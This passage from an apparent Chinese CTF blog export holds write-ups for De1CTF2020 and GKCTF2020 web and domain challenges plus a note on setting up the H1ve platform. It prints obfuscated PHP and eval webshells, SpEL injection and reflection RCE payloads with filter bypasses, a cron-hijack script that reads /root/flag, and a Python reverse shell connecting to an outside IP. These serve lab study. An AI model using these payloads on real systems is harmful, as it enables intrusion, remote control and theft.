class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>= $___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_[__]($_[_])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/De1CTF2020-复现/image-20200511210746555.png" alt="image-20200511210746555"></p>
<p>再利用这个马写一个新的马</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">__</span>=system&amp;_=echo ^&lt;?php eval(<span class="variable">$_POST</span>[<span class="string">'a'</span>])<span class="comment">; &gt; a.php</span></span><br></pre></td></tr></table></figure>

<p>在window下 <code>^</code>表示转义</p>
<p>既然是域渗透，当然得有个高级点的shell，我是用frp把kali的端口转发到公网vps，然后用蚁剑回弹了CS shell</p>
<p>然后用对域内进行信息收集，发现了Hint</p>
<p><img src="/2020/05/De1CTF2020-复现/1.jpg" alt="1"></p>
<p>打开Hint发现了个加密的压缩包</p>
<p><img src="/2020/05/De1CTF2020-复现/2.jpg" alt="2"></p>
<p>后面是利用利用<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">SYSVOL还原组策略</a>中保存的密码</p>
<p>然后接着收集信息</p>
<p><img src="/2020/05/De1CTF2020-复现/3.jpg" alt="3"></p>
<p>发现了HintZip_Pass用户</p>
<p><img src="/2020/05/De1CTF2020-复现/4.jpg" alt="4"></p>
<p>其OU是Zip_Password</p>
<p><img src="/2020/05/De1CTF2020-复现/5.jpg" alt="5"></p>
<p>然后有个gplink，然后对这个GPO信息收集</p>
<p><img src="/2020/05/De1CTF2020-复现/6.jpg" alt="6"></p>
<p>后面用Get-GPPPassword.ps1报错了</p>
<p><img src="/2020/05/De1CTF2020-复现/7.jpg" alt="7"></p>
<p>后面把cpassword复制下来 用gpp-decrypt解密</p>
<p>之所以能解密，是微软公布了<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a></p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200514114823222.png" alt="image-20200514114823222"></p>
<p>解压后，里面有flag和第二关的提示</p>
<p>根据提示对De1ta用户进行信息收集</p>
<p><img src="/2020/05/De1CTF2020-复现/8.jpg" alt="8"></p>
<p>发现web用户对De1ta用户的servicePrincipalName具有写权限，然后可以通过web用户给De1ta用户设置spn然后通过Kerberoasting获取hash，本地暴力破解密码</p>
<p>给De1ta用户设置spn</p>
<p><img src="/2020/05/De1CTF2020-复现/9.jpg" alt="9"></p>
<p>接着用Rubeus获取SPN的hash。后面写的时候环境突然没了 ，内网漫游结束了</p>
<h4 id="4-calc"><a href="#4-calc" class="headerlink" title="4.calc"></a>4.calc</h4><p>javaweb基本没接触过，看了些网上的文章算是学习吧</p>
<p>没了解过EL表达式 的可以看看这篇<a href="https://xz.aliyun.com/t/7692#toc-12" target="_blank" rel="noopener">文章</a></p>
<p>从计算器页面的标签图标看，是一个Spring框架，而抓包看GET请求则是暗示spel表达式注入</p>
<p>常见payload</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span><br><span class="line"><span class="function"><span class="title">T</span><span class="params">(java.lang.Runtime)</span></span>.getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line"><span class="function"><span class="title">T</span><span class="params">(Thread)</span></span>.sleep(<span class="number">10000</span>)</span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getRuntime().exec(<span class="string">'nslookup a.com'</span>)</span><br><span class="line">new java<span class="selector-class">.lang</span>.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(null),<span class="string">'curl 172.17.0.1:9898'</span>)</span><br></pre></td></tr></table></figure>

<p>先Fuzz发现过滤了一些关键字</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">ProcessBuilder</span><br><span class="line"><span class="keyword">string</span></span><br><span class="line"><span class="keyword">new</span></span><br><span class="line">getclass</span><br><span class="line">java.lang</span><br><span class="line">Runtime</span><br><span class="line">T(</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>因为目的是读文件，所以可以先不关注命令执行。但不管什么目的，致命的是 <code>new</code>关键字被拦截，无法创建对象实例。这可能导致很多技巧无法使用。</p>
<p>1.但依然可以找到合适的静态方法执行代码读取flag</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">java.nio.file.<span class="module-access"><span class="module"><span class="identifier">Files</span>.</span></span>read<span class="constructor">AllLines(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths.<span class="params">get</span>(<span class="string">"/flag"</span>)</span>, java.nio.charset.<span class="module-access"><span class="module"><span class="identifier">Charset</span>.</span></span>default<span class="constructor">Charset()</span>)</span><br></pre></td></tr></table></figure>

<p>转成SpEL语法</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Files)</span>.read<span class="constructor">AllLines(T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths)</span>.get('/flag'), <span class="constructor">T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">charset</span>.Charset)</span>.default<span class="constructor">Charset()</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://juejin.im/post/5cdc21626fb9a0320c5ad583" target="_blank" rel="noopener">java的5种文件读取方法</a></p>
<p>但这里有个问题，<code>T()</code>被过滤了 但可以用 <code>%00</code>绕过</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">T%<span class="number">00</span>(java.net.URLClassLoader).get<span class="constructor">SystemClassLoader()</span>.load<span class="constructor">Class(<span class="string">"java.nio.file.Files"</span>)</span>.read<span class="constructor">AllLines(T%00(<span class="params">java</span>.<span class="params">net</span>.URLClassLoader)</span>.get<span class="constructor">SystemClassLoader()</span>.load<span class="constructor">Class(<span class="string">"java.nio.file.Paths"</span>)</span>.get(<span class="string">"/flag"</span>))</span><br></pre></td></tr></table></figure>

<p>这里顺便提一下 T()和%00</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">T</span>()  调用一个类的静态方法，它将返回一个 <span class="variable">Class</span> <span class="variable"><span class="class">Object</span></span>，会调用类作用域的方法和常量</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">后面用<span class="number">0</span><span class="variable">x00</span>截断绕过对<span class="title">T</span>(的过滤。</span></span><br></pre></td></tr></table></figure>

<p>2.利用大小写绕过new关键字过滤</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">nEw java.io.<span class="constructor">BufferedReader(<span class="params">nEw</span> <span class="params">java</span>.<span class="params">io</span>.FileReader(<span class="string">"/flag"</span>)</span>).read<span class="constructor">Line()</span></span><br></pre></td></tr></table></figure>

<p>3.利用java反射机制获取类</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.<span class="keyword">class</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Files')</span>.read<span class="constructor">AllLines(''.<span class="params">class</span>.<span class="params">forName</span>('<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths')</span>.get('/flag'))</span><br></pre></td></tr></table></figure>

<p>同理也可以达到RCE的目的</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>).invoke(''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null),'calc')</span><br></pre></td></tr></table></figure>

<p>payload分析</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.get<span class="constructor">Class()</span></span><br><span class="line"><span class="comment">// class java.lang.String</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span></span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>)</span><br><span class="line"><span class="comment">// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span></span><br><span class="line"><span class="comment">// public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null)</span><br><span class="line"><span class="comment">// java.lang.Runtime@c2939a</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>).invoke(''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null),'calc')</span><br><span class="line"><span class="comment">// java.lang.ProcessImpl@f2f85c</span></span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>记录几道有意思的吧</p>
<h4 id="1-mc-easybgm"><a href="#1-mc-easybgm" class="headerlink" title="1.mc_easybgm"></a>1.mc_easybgm</h4><p>mp3的每一帧的第24位是一个保留位，可以用来隐写具体看图</p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200521215418475.png" alt="image-20200521215418475"></p>
<p>具体的加解密看<a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/misc/mc_easybgm/mp3.py" target="_blank" rel="noopener">脚本</a></p>
<p><img src="/2020/05/De1CTF2020-复现/image-20200521215823502.png" alt="image-20200521215823502"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>De1</tag>
      </tags>
  </entry>
  <entry>
    <title>H1ve搭建问题</title>
    <url>/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-找不到PWD"><a href="#1-找不到PWD" class="headerlink" title="1.找不到PWD"></a>1.找不到PWD</h3><p><img src="/2021/01/H1ve搭建问题/image-20210107150823208.png" alt="image-20210107150823208"></p><p>H1ve的版本是1.1.3</p><p>使用</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">docker-compose</span> <span class="selector-tag">-f</span> <span class="selector-tag">single</span><span class="selector-class">.yml</span> <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1ve搭建问题/image-20210107151152146.png" alt="image-20210107151152146"></p><p>这里警告PWD未定义，所以我们在项目下创建<code>.env</code>定义一下就行</p><p><img src="/2021/01/H1ve搭建问题/image-20210107151304373.png" alt="image-20210107151304373"></p><h3 id="2-访问过慢"><a href="#2-访问过慢" class="headerlink" title="2.访问过慢"></a>2.访问过慢</h3><p>这个问题其实是个css文件引起的，引用的这个css文件的域名被墙了 - -！</p><p>导致这个问题后面偶然才发现的</p><p><img src="/2021/01/H1ve搭建问题/image-20210107153325242.png" alt="image-20210107153325242"></p><p>我的解决办法是把<code>all.css</code>下载下来放到服务器上，再修改引用的URL</p><a id="more"></a>











<p><img src="/2021/01/H1ve搭建问题/image-20210107153828399.png" alt="image-20210107153828399"></p>
<p>然后修改fontawesome-fonts.css </p>
<p><img src="/2021/01/H1ve搭建问题/image-20210107154100385.png" alt="image-20210107154100385"></p>
<p><img src="/2021/01/H1ve搭建问题/image-20210107154343809.png" alt="image-20210107154343809"></p>
<h3 id="3-redis缓存不释放，页面500"><a href="#3-redis缓存不释放，页面500" class="headerlink" title="3.redis缓存不释放，页面500"></a>3.redis缓存不释放，页面500</h3><p>这个bug官方还没修复，所以只能自己修复</p>
<p>利用这个工具清理过期的redis缓存<a href="https://github.com/emacsist/redis-con-release" target="_blank" rel="noopener">https://github.com/emacsist/redis-con-release</a></p>
<p>但是这个工具是一天清除一次，本来想重写build的，但是有些包丢失了</p>
<p>所以就写了个脚本</p>
<p>kill.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">cd</span> / &amp;&amp; timeout 5 ./app-linux-amd64 &amp;&amp; sleep 600</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>获取容器id</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo docker container <span class="keyword">ps</span> |<span class="keyword">grep</span> redis</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/H1ve搭建问题/image-20210107155615543.png" alt="image-20210107155615543"></p>
<p>把工具、脚本复制到容器</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="keyword">cp</span> ./app-linux-amd64   <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./app.json  <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./kill.<span class="keyword">sh</span>   <span class="number">1</span>dc:/</span><br></pre></td></tr></table></figure>

<p>进入容器，执行脚本</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it 1dc  <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> /</span><br><span class="line">nohup <span class="string">./kill.sh</span> &amp;</span><br></pre></td></tr></table></figure>

<p>当然脚本也可以根据需求修改</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF平台</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020-WP</title>
    <url>/2020/05/GKCTF2020-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Check-IN"><a href="#1-Check-IN" class="headerlink" title="1.Check IN"></a>1.Check IN</h3><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524132441686.png" alt="image-20200524132441686"></p><p>进去就是一个马</p><p>执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。</p><p>先用蚁剑连接</p><p>构造如下URL，<a href="http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a" target="_blank" rel="noopener">http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a</a></p><a id="more"></a>




<p>或者修改编码器</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524133145293.png" alt="image-20200524133145293"></p>
<p>上传恶意<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">so文件和bypass.php</a>接着读flag</p>
<p><code>http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9HRVRbJ2EnXSk7Cg==&amp;a=include(%27/var/tmp/1.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/var/tmp/1.so</code></p>
<h3 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h3><p>用的是shopxo模板，这里有个后台Getshell的漏洞。具体看这篇<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">文章</a></p>
<p>拿到shell用蚁剑连</p>
<p><a href="http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php" target="_blank" rel="noopener">http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php</a></p>
<p>然后发现根目录下有flag</p>
<p>告诉我们flag在根目录</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145719302.png" alt="image-20200524145719302"></p>
<p>flag.hint有点奇怪</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145846453.png" alt="image-20200524145846453"></p>
<p>直到看到auto.sh，原来是个定时任务</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145602985.png" alt="image-20200524145602985"></p>
<p>接着修改makeflaghint.py遍历/root/</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    paths = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">        com_path = os.path.join(path,i)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(com_path):</span><br><span class="line">            get_all(com_path)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(com_path):</span><br><span class="line">            path_list.append(com_path)</span><br><span class="line">        <span class="keyword">with</span>  open(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(com_path+<span class="string">'\n'</span>)</span><br><span class="line">        print(com_path) </span><br><span class="line">get_all(path=<span class="string">r'/root'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/20232423444217.png" alt="20232423444217"></p>
<p>发现flag接着读取就行</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">"/root/flag"</span>)</span><br><span class="line">aaa=f1.<span class="built_in">read</span>()</span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">with</span>  <span class="built_in">open</span>(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(aaa+<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"D"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145546293.png" alt="image-20200524145546293"></p>
<p>后面看官方WP是反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"174.1.118.22"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<h3 id="3-CVE版签到"><a href="#3-CVE版签到" class="headerlink" title="3.CVE版签到"></a>3.CVE版签到</h3><p>开始没看懂这题在干啥，后面提示<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">CVE-2020-7066</a> gethead函数存在%00截断</p>
<p>就试了文章里的Payload发现啥也没有。直到看了WP才发现原来都是Burp的锅</p>
